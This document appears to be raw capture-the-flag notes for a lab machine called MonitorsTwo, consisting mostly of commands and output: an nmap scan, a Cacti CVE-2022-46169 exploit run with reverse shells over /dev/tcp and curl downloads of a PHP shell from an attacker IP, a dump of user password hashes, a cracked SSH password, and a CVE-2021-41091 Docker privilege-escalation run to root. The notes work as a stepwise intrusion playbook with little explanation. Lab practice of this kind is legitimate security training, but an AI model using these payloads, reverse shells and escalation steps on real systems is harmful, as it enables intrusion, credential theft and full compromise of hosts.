┌──(anhndt㉿Laptop14)-[~]
└─$ nmap -sCV -Pn -p- 10.10.11.211 2>/dev/null
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 14:45 +07
Nmap scan report for 10.10.11.211
Host is up (0.082s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 164.71 seconds





python3 CVE-2022-46169.py http://monitorstwo.htb -c "curl http://10.10.16.24/$(whoami)"

python3 CVE-2022-46169.py http://monitorstwo.htb -c "bash -i >\& /dev/tcp/10.10.16.24/7050 0>\&1"

sh -i >& /dev/tcp/10.10.16.24/7050 0>&1

python3 CVE-2022-46169/CVE-2022-46169.py http://monitorstwo.htb -c "curl http://10.10.16.24:8000/nsrs1.php -o nsrs1.php"


$ capsh --print
Current: cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap=eip
Bounding set =cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: cap_chown,!cap_dac_override,!cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,!cap_linux_immutable,cap_net_bind_service,!cap_net_broadcast,!cap_net_admin,cap_net_raw,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,cap_sys_chroot,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_mknod,!cap_lease,cap_audit_write,!cap_audit_control,cap_setfcap,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=33(root) euid=0(root)
gid=33(www-data)
groups=33(www-data)
Guessed mode: UNCERTAIN (0)




50bca5e748b0

docker run --rm -it --pid=50bca5e748b0 --privileged ubuntu bash



$ cat /entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"



script /dev/null -qc /bin/bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;



CREATE TABLE user_auth (
  `id` mediumint(8) unsigned NOT NULL auto_increment,
  `username` varchar(50) NOT NULL default '0',
  `password` varchar(256) NOT NULL default '',
  `realm` mediumint(8) NOT NULL default '0',
  `full_name` varchar(100) default '0',
  `email_address` varchar(128) NULL,
  `must_change_password` char(2) default NULL,
  `password_change` char(2) default 'on',
  `show_tree` char(2) default 'on',
  `show_list` char(2) default 'on',
  `show_preview` char(2) NOT NULL default 'on',
  `graph_settings` char(2) default NULL,
  `login_opts` tinyint(3) unsigned NOT NULL default '1',
  `policy_graphs` tinyint(3) unsigned NOT NULL default '1',
  `policy_trees` tinyint(3) unsigned NOT NULL default '1',
  `policy_hosts` tinyint(3) unsigned NOT NULL default '1',
  `policy_graph_templates` tinyint(3) unsigned NOT NULL default '1',
  `enabled` char(2) NOT NULL DEFAULT 'on',
  `lastchange` int(11) NOT NULL DEFAULT '-1',
  `lastlogin` int(11) NOT NULL DEFAULT '-1',
  `password_history` varchar(4096) NOT NULL DEFAULT '-1',
  `locked` varchar(3) NOT NULL DEFAULT '',
  `failed_attempts` int(5) NOT NULL DEFAULT '0',
  `lastfail` int(10) unsigned NOT NULL DEFAULT '0',
  `reset_perms` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `username` (`username`),
  KEY `realm` (`realm`),
  KEY `enabled` (`enabled`)
) ENGINE=InnoDB ROW_FORMAT=Dynamic;

--
-- Dumping data for table `user_auth`
--

INSERT INTO user_auth VALUES (1,'admin','21232f297a57a5a743894a0e4a801fc3',0,'Administrator','','on','on','on','on','on','on',2,1,1,1,1,'on',-1,-1,'-1','',0,0,0);
INSERT INTO user_auth VALUES (3,'guest','43e9a4ab75570f5b',0,'Guest Account','','on','on','on','on','on',3,1,1,1,1,1,'',-1,-1,'-1','',0,0,0);


----------------------------------------------------------------------------------------------------------------------------------------------------------


www-data@50bca5e748b0:/tmp/test$ cat /entrypoint.sh
cat /entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"

-----------------------------------------------------------------------------

mysql -u root -p -h db

MySQL [cacti]> select * from user_auth;
select * from user_auth;
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name      | email_address          | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |     0 | Jamie Thompson | admin@monitorstwo.htb  |                      | on              | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   663348655 |
|  3 | guest    | 43e9a4ab75570f5b                                             |     0 | Guest Account  |                        | on                   | on              | on        | on        | on           | 3              |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |           0 |
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |     0 | Marcus Brune   | marcus@monitorstwo.htb |                      |                 | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  | on     |               0 |        0 |  2135691668 |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+



marcus:funkymonkey
admin:


ssh marcus@10.10.11.211
funkymonkey



/home/marcus
/home/marcus/.bash_logout
/home/marcus/.cache
/home/marcus/.cache/motd.legal-displayed
/home/marcus/.bashrc
/home/marcus/.profile
/run/user/1000
/run/user/1000/pk-debconf-socket
/run/user/1000/gnupg
/run/user/1000/gnupg/S.gpg-agent
/run/user/1000/gnupg/S.gpg-agent.ssh
/run/user/1000/gnupg/S.gpg-agent.extra
/run/user/1000/gnupg/S.gpg-agent.browser
/run/user/1000/gnupg/S.dirmngr
/run/user/1000/bus
/run/user/1000/systemd
/run/user/1000/systemd/private
/run/user/1000/systemd/notify
/run/user/1000/systemd/units
/run/user/1000/systemd/units/invocation:dbus.socket
/run/user/1000/inaccessible


╔══════════╣ Mails (limit 50)
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/mail/marcus
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/spool/mail/marcus

╔══════════╣ Analyzing Cacti Files (limit 70)
drwxr-xr-x 5 root root 4096 Mar 22 13:21 /usr/share/cacti


marcus@monitorstwo:/tmp$ cat /var/mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team


marcus@monitorstwo:/tmp$ docker --version
Docker version 20.10.5+dfsg1, build 55c4c88


marcus@monitorstwo:/tmp/test$ ./exp.sh
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit


manual
ref: https://exploit-notes.hdks.org/exploit/container/docker/moby-docker-engine-privesc/
ref: https://www.cyberark.com/resources/threat-research-blog/how-docker-made-me-more-capable-and-the-host-less-secure





















































































































































































































































































































































































































































































































































































































































































































































